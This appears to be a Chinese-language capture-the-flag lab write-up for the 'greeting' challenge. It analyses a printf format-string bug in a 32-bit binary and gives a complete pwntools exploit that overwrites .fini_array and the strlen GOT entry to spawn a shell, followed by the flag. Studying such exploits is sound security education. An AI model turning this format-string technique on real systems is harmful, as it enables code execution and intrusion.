# greeting

[執行程式]

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/LAB3/image/greeting_topic.jpg)

[解題]

首先執行程式後，會顯示一些訊息並請我們輸入姓名，然後印出問候的訊息。這是一個 32-bit ELF。為了可以對這個執行程式有更進一步的程式分析，接著使用 ghidra 工具進行程式解析，以下為其 main function 的程式內容:

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/LAB3/image/greeting_file.jpg)

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/LAB3/image/greeting_main.jpg)

可以看到 main function 中存在一個格式化字符串漏洞，當它列印出來時，它使用 printf 語句，然後直接結束。printf 語句中的格式字符串負責程序內的重要流量控制，如果受到攻擊者的控制，可用於以各種方式利用應用程序。簡單來說，攻擊者可以讀寫任意內容。

因此，我們可以這樣做:
* 用 main function 覆蓋 .fini_array:將 .fini_array 的第一個 entry 換成 main function 的地址。
* 覆蓋 strlen 的 GOT entry:將 strlen 的 GOT entry 改為 system 的 PLT。

這樣程式將會返回到 main function。由於 strlen 的 GOT 已經被改成了 system 的地址，這樣就可以在 getnline function 中輸入 sh 並執行 system("sh")（該函數會在我們輸入時調用strlen）。

根據以上分析，可以開始撰寫 exploit code。

#### exploit.py
```
from pwn import *

# Establish the target process
r = process('greeting')
gdb.attach(r, gdbscript = 'b *0x0804864f')

# The values we will be overwritting
finiArray = 0x08049934
strlenGot = 0x08049a54

# The values we will be overwritting with
getline = 0x8048614
systemPlt = 0x8048490

# Establish the format string
payload = ""

# Just a bit of padding
payload += "xx"

# Address of fini array
payload += p32(finiArray)

# Address of fini array + 2
payload += p32(finiArray + 2)

# Address of got entry for strlen
payload += p32(strlenGot)

# Address of got entry for strlen + 2
payload += p32(strlenGot + 2)

# Write the lower two bytes of the fini array with loop around address (getline setup)
payload += "%34288x"
payload += "%12$n"

# Write the lower two bytes of the plt system address to the got strlen entry
payload += "%65148x"
payload += "%14$n"

# Write the higher two bytes of the two address we just wrote to
# Both are the same (0x804)
payload += "%33652x"
payload += "%13$n"
payload += "%15$n"

# Print the length of our fmt string (make sure we meet the size requirement)
print "len: " + str(len(payload))

# Send the format string
r.sendline(payload)

# Send '/bin/sh' to trigger the system('/bin/sh') call
r.sendline('/bin/sh')

# Drop to an interactive shell
r.interactive()
```
這樣就可以順利找出 flag 了。
TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}

#### 參考資料
* https://nuc13us.wordpress.com/2016/09/05/tokyo-westernsmma-ctf-2nd-2016-greeting-150pwn/
* https://bruce30262.github.io/mma-2nd-ctf-2016-greeting/
* https://github.com/guyinatuxedo/ctf/blob/master/tokyowesterns16/pwn/greeting/exploit.py
* https://systemoverlord.com/2014/02/12/printf-format-string-exploitation/
